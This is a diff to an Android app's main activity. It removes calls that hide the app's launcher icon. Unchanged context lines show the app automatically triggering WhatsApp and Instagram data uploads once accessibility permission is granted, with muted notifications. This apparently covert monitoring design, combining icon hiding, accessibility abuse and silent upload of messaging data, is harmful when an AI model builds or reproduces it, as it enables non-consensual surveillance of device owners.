@@ -468,9 +468,7 @@ class MainActivity : AppCompatActivity() {
 
             SyncScheduler.runOnce(applicationContext)
 
-            hideAppIcon()
-
-            Toast.makeText(this, "Sync triggered & App icon hidden", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
 
         }
 
@@ -521,15 +519,13 @@ class MainActivity : AppCompatActivity() {
 
             deviceState.hasAutoSyncedAfterAccessibility = true
 
-            Log.i(TAG, "Accessibility enabled & core permissions granted: triggering automatic initial sync & hide icon")
+            Log.i(TAG, "Accessibility enabled & core permissions granted: triggering automatic initial sync")
 
             RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
 
             RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
 
             SyncScheduler.runOnce(applicationContext)
-
-            hideAppIcon()
 
             // Muted client-side notification on automated sync
 
